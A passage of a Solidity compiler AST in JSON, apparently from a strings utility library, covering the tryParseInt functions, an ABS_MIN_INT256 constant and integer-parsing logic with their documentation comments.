0"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":832,"name":"_tryParseIntUncheckedBounds","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1006,"src":"8545:27:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_int256_$","typeString":"function (string memory,uint256,uint256) pure returns (bool,int256)"}},"id":840,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8545:58:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_int256_$","typeString":"tuple(bool,int256)"}},"functionReturnParameters":831,"id":841,"nodeType":"Return","src":"8538:65:3"}]},"documentation":{"id":823,"nodeType":"StructuredDocumentation","src":"8143:287:3","text":" @dev Variant of {parseInt-string} that returns false if the parsing fails because of an invalid character or if\n the result does not fit in a `int256`.\n NOTE: This function will revert if the absolute value of the result does not fit in a `uint256`."},"id":843,"implemented":true,"kind":"function","modifiers":[],"name":"tryParseInt","nameLocation":"8444:11:3","nodeType":"FunctionDefinition","parameters":{"id":826,"nodeType":"ParameterList","parameters":[{"constant":false,"id":825,"mutability":"mutable","name":"input","nameLocation":"8470:5:3","nodeType":"VariableDeclaration","scope":843,"src":"8456:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":824,"name":"string","nodeType":"ElementaryTypeName","src":"8456:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"8455:21:3"},"returnParameters":{"id":831,"nodeType":"ParameterList","parameters":[{"constant":false,"id":828,"mutability":"mutable","name":"success","nameLocation":"8505:7:3","nodeType":"VariableDeclaration","scope":843,"src":"8500:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":827,"name":"bool","nodeType":"ElementaryTypeName","src":"8500:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":830,"mutability":"mutable","name":"value","nameLocation":"8521:5:3","nodeType":"VariableDeclaration","scope":843,"src":"8514:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":829,"name":"int256","nodeType":"ElementaryTypeName","src":"8514:6:3","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"8499:28:3"},"scope":1631,"src":"8435:175:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"constant":true,"id":848,"mutability":"constant","name":"ABS_MIN_INT256","nameLocation":"8641:14:3","nodeType":"VariableDeclaration","scope":1631,"src":"8616:50:3","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":844,"name":"uint256","nodeType":"ElementaryTypeName","src":"8616:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"commonType":{"typeIdentifier":"t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1","typeString":"int_const 5789...(69 digits omitted)...9968"},"id":847,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":845,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8658:1:3","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"323535","id":846,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8663:3:3","typeDescriptions":{"typeIdentifier":"t_rational_255_by_1","typeString":"int_const 255"},"value":"255"},"src":"8658:8:3","typeDescriptions":{"typeIdentifier":"t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1","typeString":"int_const 5789...(69 digits omitted)...9968"}},"visibility":"private"},{"body":{"id":884,"nodeType":"Block","src":"9132:143:3","statements":[{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":872,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":868,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":862,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":855,"src":"9146:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":865,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":851,"src":"9158:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":864,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"9152:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":863,"name":"bytes","nodeType":"ElementaryTypeName","src":"9152:5:3","typeDescriptions":{}}},"id":866,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9152:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":867,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"9165:6:3","memberName":"length","nodeType":"MemberAccess","src":"9152:19:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"9146:25:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"||","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":871,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":869,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":853,"src":"9175:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"id":870,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":855,"src":"9183:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"9175:11:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"9146:40:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":877,"nodeType":"IfStatement","src":"9142:63:3","trueBody":{"expression":{"components":[{"hexValue":"66616c7365","id":873,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"9196:5:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"false"},{"hexValue":"30","id":874,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9203:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"id":875,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"9195:10:3","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_rational_0_by_1_$","typeString":"tuple(bool,int_const 0)"}},"functionReturnParameters":861,"id":876,"nodeType":"Return","src":"9188:17:3"}},{"expression":{"arguments":[{"id":879,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":851,"src":"9250:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"id":880,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":853,"src":"9257:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":881,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":855,"src":"9264:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":878,"name":"_tryParseIntUncheckedBounds","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1006,"src":"9222:27:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_int256_$","typeString":"function (string memory,uint256,uint256) pure returns (bool,int256)"}},"id":882,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9222:46:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_int256_$","typeString":"tuple(bool,int256)"}},"functionReturnParameters":861,"id":883,"nodeType":"Return","src":"9215:53:3"}]},"documentation":{"id":849,"nodeType":"StructuredDocumentation","src":"8673:303:3","text":" @dev Variant of {parseInt-string-uint256-uint256} that returns false if the parsing fails because of an invalid\n character or if the result does not fit in a `int256`.\n NOTE: This function will revert if the absolute value of the result does not fit in a `uint256`."},"id":885,"implemented":true,"kind":"function","modifiers":[],"name":"tryParseInt","nameLocation":"8990:11:3","nodeType":"FunctionDefinition","parameters":{"id":856,"nodeType":"ParameterList","parameters":[{"constant":false,"id":851,"mutability":"mutable","name":"input","nameLocation":"9025:5:3","nodeType":"VariableDeclaration","scope":885,"src":"9011:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":850,"name":"string","nodeType":"ElementaryTypeName","src":"9011:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"},{"constant":false,"id":853,"mutability":"mutable","name":"begin","nameLocation":"9048:5:3","nodeType":"VariableDeclaration","scope":885,"src":"9040:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":852,"name":"uint256","nodeType":"ElementaryTypeName","src":"9040:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":855,"mutability":"mutable","name":"end","nameLocation":"9071:3:3","nodeType":"VariableDeclaration","scope":885,"src":"9063:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":854,"name":"uint256","nodeType":"ElementaryTypeName","src":"9063:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"9001:79:3"},"returnParameters":{"id":861,"nodeType":"ParameterList","parameters":[{"constant":false,"id":858,"mutability":"mutable","name":"success","nameLocation":"9109:7:3","nodeType":"VariableDeclaration","scope":885,"src":"9104:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":857,"name":"bool","nodeType":"ElementaryTypeName","src":"9104:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":860,"mutability":"mutable","name":"value","nameLocation":"9125:5:3","nodeType":"VariableDeclaration","scope":885,"src":"9118:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":859,"name":"int256","nodeType":"ElementaryTypeName","src":"9118:6:3","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"9103:28:3"},"scope":1631,"src":"8981:294:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1005,"nodeType":"Block","src":"9675:812:3","statements":[{"assignments":[900],"declarations":[{"constant":false,"id":900,"mutability":"mutable","name":"buffer","nameLocation":"9698:6:3","nodeType":"VariableDeclaration","scope":1005,"src":"9685:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":899,"name":"bytes","nodeType":"ElementaryTypeName","src":"9685:5:3","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"id":905,"initialValue":{"arguments":[{"id":903,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":888,"src":"9713:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":902,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"9707:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":901,"name":"bytes","nodeType":"ElementaryTypeName","src":"9707:5:3","typeDescriptions":{}}},"id":904,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9707:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"nodeType":"VariableDeclarationStatement","src":"9685:34:3"},{"assignments":[907],"declarations":[{"constant":false,"id":907,"mutability":"mutable","name":"sign","nameLocation":"9783:4:3","nodeType":"VariableDeclaration","scope":1005,"src":"9776:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"},"typeName":{"id":906,"name":"bytes1","nodeType":"ElementaryTypeName","src":"9776:6:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"visibility":"internal"}],"id":923,"initialValue":{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":910,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":908,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":890,"src":"9790:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"id":909,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":892,"src":"9799:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"9790:12:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseExpression":{"arguments":[{"arguments":[{"id":918,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":900,"src":"9847:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":919,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":890,"src":"9855:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":917,"name":"_unsafeReadBytesOffset","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1630,"src":"9824:22:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes_memory_ptr_$_t_uint256_$returns$_t_bytes32_$","typeString":"function (bytes memory,uint256) pure returns (bytes32)"}},"id":920,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9824:37:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":916,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"9817:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes1_$","typeString":"type(bytes1)"},"typeName":{"id":915,"name":"bytes1","nodeType":"ElementaryTypeName","src":"9817:6:3","typeDescriptions":{}}},"id":921,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9817:45:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":922,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"Conditional","src":"9790:72:3","trueExpression":{"arguments":[{"hexValue":"30","id":913,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9812:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":912,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"9805:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes1_$","typeString":"type(bytes1)"},"typeName":{"id":911,"name":"bytes1","nodeType":"ElementaryTypeName","src":"9805:6:3","typeDescriptions":{}}},"id":914,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9805:9:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"VariableDeclarationStatement","src":"9776:86:3"},{"assignments":[925],"declarations":[{"constant":false,"id":925,"mutability":"mutable","name":"positiveSign","nameLocation":"9948:12:3","nodeType":"VariableDeclaration","scope":1005,"src":"9943:17:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":924,"name":"bool","nodeType":"ElementaryTypeName","src":"9943:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"id":932,"initialValue":{"commonType":{"typeIdentifier":"t_bytes1","typeString":"bytes1"},"id":931,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":926,"name":"sign","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":907,"src":"9963:4:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"2b","id":929,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"9978:3:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_728b8dbbe730d9acd55e30e768e6a28a04bea0c61b88108287c2c87d79c98bb8","typeString":"literal_string \"+\""},"value":"+"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_728b8dbbe730d9acd55e30e768e6a28a04bea0c61b88108287c2c87d79c98bb8","typeString":"literal_string \"+\""}],"id":928,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"9971:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes1_$","typeString":"type(bytes1)"},"typeName":{"id":927,"name":"bytes1","nodeType":"ElementaryTypeName","src":"9971:6:3","typeDescriptions":{}}},"id":930,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9971:11:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"src":"9963:19:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"VariableDeclarationStatement","src":"9943:39:3"},{"assignments":[934],"declarations":[{"constant":false,"id":934,"mutability":"mutable","name":"negativeSign","nameLocation":"9997:12:3","nodeType":"VariableDeclaration","scope":1005,"src":"9992:17:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":933,"name":"bool","nodeType":"ElementaryTypeName","src":"9992:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"id":941,"initialValue":{"commonType":{"typeIdentifier":"t_bytes1","typeString":"bytes1"},"id":940,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":935,"name":"sign","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":907,"src":"10012:4:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"2d","id":938,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"10027:3:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_d3b8281179950f98149eefdb158d0e1acb56f56e8e343aa9fefafa7e36959561","typeString":"literal_string \"-\""},"value":"-"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_d3b8281179950f98149eefdb158d0e1acb56f56e8e343aa9fefafa7e36959561","typeString":"literal_string \"-\""}],"id":937,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10020:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes1_$","typeString":"type(bytes1)"},"typeName":{"id":936,"name":"bytes1","nodeType":"ElementaryTypeName","src":"10020:6:3","typeDescriptions":{}}},"id":939,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10020:11:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"src":"10012:19:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"VariableDeclarationStatement","src":"9992:39:3"},{"assignments":[943],"declarations":[{"constant":false,"id":943,"mutability":"mutable","name":"offset","nameLocation":"10049:6:3","nodeType":"VariableDeclaration","scope":1005,"src":"10041:14:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":942,"name":"uint256","nodeType":"ElementaryTypeName","src":"10041:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":950,"initialValue":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"components":[{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":946,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":944,"name":"positiveSign","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":925,"src":"10059:12:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"||","rightExpression":{"id":945,"name":"negativeSign","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":934,"src":"10075:12:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"10059:28:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"id":947,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"10058:30:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":948,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"10089:6:3","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"10058:37:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$attached_to$_t_bool_$","typeString":"function (bool) pure returns (uint256)"}},"id":949,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10058:39:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"10041:56:3"},{"assignments":[952,954],"declarations":[{"constant":false,"id":952,"mutability":"mutable","name":"absSuccess","nameLocation":"10114:10:3","nodeType":"VariableDeclaration","scope":1005,"src":"10109:15:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":951,"name":"bool","nodeType":"ElementaryTypeName","src":"10109:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":954,"mutability":"mutable","name":"absValue","nameLocation":"10134:8:3","nodeType":"VariableDeclaration","scope":1005,"src":"10126:16:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":953,"name":"uint256","nodeType":"ElementaryTypeName","src":"10126:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":962,"initialValue":{"arguments":[{"id":956,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":888,"src":"10159:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":959,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":957,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":890,"src":"10166:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"id":958,"name":"offset","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":943,"src":"10174:6:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10166:14:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":960,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":892,"src":"10182:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":955,"name":"tryParseUint","nodeType":"Identifier","overloadedDeclarations":[665,702],"referencedDeclaration":702,"src":"10146:12:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_uint256_$","typeString":"function (string memory,uint256,uint256) pure returns (bool,uint256)"}},"id":961,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10146:40:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_uint256_$","typeString":"tuple(bool,uint256)"}},"nodeType":"VariableDeclarationStatement","src":"10108:78:3"},{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":967,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":963,"name":"absSuccess","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":952,"src":"10201:10:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":966,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":964,"name":"absValue","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":954,"src":"10215:8:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":965,"name":"ABS_MIN_INT256","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":848,"src":"10226:14:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10215:25:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"10201:39:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":989,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":985,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":983,"name":"absSuccess","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":952,"src":"10343:10:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"id":984,"name":"negativeSign","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":934,"src":"10357:12:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"10343:26:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":988,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":986,"name":"absValue","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":954,"src":"10373:8:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeSt